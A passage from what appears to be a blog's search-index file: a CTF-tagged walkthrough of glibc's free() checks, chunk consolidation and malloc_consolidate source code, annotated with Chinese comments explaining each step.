class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>    <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>      (<span class="hljs-type">void</span>)mutex_lock(&amp;av-&gt;mutex);<br>      locked = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    nextchunk = chunk_at_offset(p, size);<br><br><span class="hljs-comment">//不是top chunk</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top))<br>      &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br><br><span class="hljs-comment">//nextchunk越界</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>  &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>  &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>      &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br><br><span class="hljs-comment">//nextchunk的preinuse检查chunk是否在使用（double free检查）</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<br>      &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br><br><span class="hljs-comment">//nextsize合法检查</span><br>    nextsize = chunksize(nextchunk);<br>    <span class="hljs-keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br>errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br><br><br><br>……<br><br><br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="chunk合并"><a href="#chunk合并" class="headerlink" title="chunk合并"></a>chunk合并</h4><p>先向下合并再向上合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c">    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br><br><span class="hljs-comment">//向下合并</span><br>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      prevsize = p-&gt;prev_size;<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      unlink(av, p, bck, fwd);<br>    &#125;<br><br><span class="hljs-comment">//上面不是top chunk</span><br>    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>      <span class="hljs-comment">/* get and clear inuse bit */</span><br>      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>      <span class="hljs-comment">/* consolidate forward */</span><br>      <span class="hljs-keyword">if</span> (!nextinuse) &#123;<span class="hljs-comment">//向上合并</span><br>unlink(av, nextchunk, bck, fwd);<br>size += nextsize;<br>      &#125; <span class="hljs-keyword">else</span><br>clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//放入unsorted bin</span><br><br>      bck = unsorted_chunks(av);<br>      fwd = bck-&gt;fd;<br><span class="hljs-comment">//检查unsorted bin第一个chunk的连接是否正确</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>&#123;<br>  errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>  <span class="hljs-keyword">goto</span> errout;<br>&#125;<br>      p-&gt;fd = fwd;<br>      p-&gt;bk = bck;<br>      <span class="hljs-keyword">if</span> (!in_smallbin_range(size))<br>&#123;<br>  p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>  p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>&#125;<br>      bck-&gt;fd = p;<br>      fwd-&gt;bk = p;<br><br>      set_head(p, size | PREV_INUSE);<br>      set_foot(p, size);<br><br>      check_free_chunk(av, p);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">      consolidate into top</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//如果上一个是top chunk，和top chunk合并</span><br>      size += nextsize;<br>      set_head(p, size | PREV_INUSE);<br>      av-&gt;top = p;<br>      check_chunk(av, p);<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="后续操作"><a href="#后续操作" class="headerlink" title="后续操作"></a>后续操作</h4><p>合并后如果chunk超过了FASTBIN_CONSOLIDATION_THRESHOLD，整理fast bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>      <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>malloc_consolidate(av);<br><br><span class="hljs-comment">//以下为返回内存操作</span><br>      <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(chunksize(av-&gt;top)) &gt;=<br>    (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.trim_threshold))<br>  systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">   large, because the corresponding heap might go away.  */</span><br>heap_info *heap = heap_for_ptr(top(av));<br><br>assert(heap-&gt;ar_ptr == av);<br>heap_trim(heap, mp_.top_pad);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>      assert (locked);<br>      (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If the chunk was allocated via mmap, release via munmap().</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">else</span> &#123;<br>    munmap_chunk (p);<br>  &#125;<br></code></pre></td></tr></table></figure><h2 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_consolidate</span><span class="hljs-params">(mstate av)</span><br>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-type">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>  <span class="hljs-keyword">if</span> (get_max_fast () != <span class="hljs-number">0</span>) &#123;<br>    clear_fastchunks(av);<br><span class="hljs-comment">//清楚av-&gt;flags有关fast bin的标志位，表示fast bin为空</span><br><br>    unsorted_bin = unsorted_chunks(av);<br><br>    maxfb = &amp;fastbin (av, NFASTBINS - <span class="hljs-number">1</span>);<br>    fb = &amp;fastbin (av, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">do</span> &#123;<br>      p = atomic_exchange_acq (fb, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">do</span> &#123;<br>  check_inuse_chunk(av, p);<br>  nextp = p-&gt;fd;<br><br>  <span class="hljs-comment">/* Slightly streamlined version of consolidation code in free() */</span><br>  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);<br>  nextchunk = chunk_at_offset(p, size);<br>  nextsize = chunksize(nextchunk);<br><br>  <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>    prevsize = p-&gt;prev_size;<br>    size += prevsize;<br>    p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>    unlink(av, p, bck, fwd);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>      size += nextsize;<br>      unlink(av, nextchunk, bck, fwd);<br>    &#125; <span class="hljs-keyword">else</span><br>      clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>    first_unsorted = unsorted_bin-&gt;fd;<br>    unsorted_bin-&gt;fd = p;<br>    first_unsorted-&gt;bk = p;<br><br>    <span class="hljs-keyword">if</span> (!in_smallbin_range (size)) &#123;<br>      p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>      p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    set_head(p, size | PREV_INUSE);<br>    p-&gt;bk = unsorted_bin;<br>    p-&gt;fd = first_unsorted;<br>    set_foot(p, size);<br>  &#125;<br><br>  <span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>  &#125;<br><br>&#125; <span class="hljs-keyword">while</span> ( (p = nextp) != <span class="hljs-number">0</span>);<br><br>      &#125;<br>    &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br><span class="hljs-comment">//遍历fastbin的每一条链和每一个chunk，合并整理同上</span><br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<span class="hljs-comment">//如果max_fast==0，则初始化av</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>source code</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
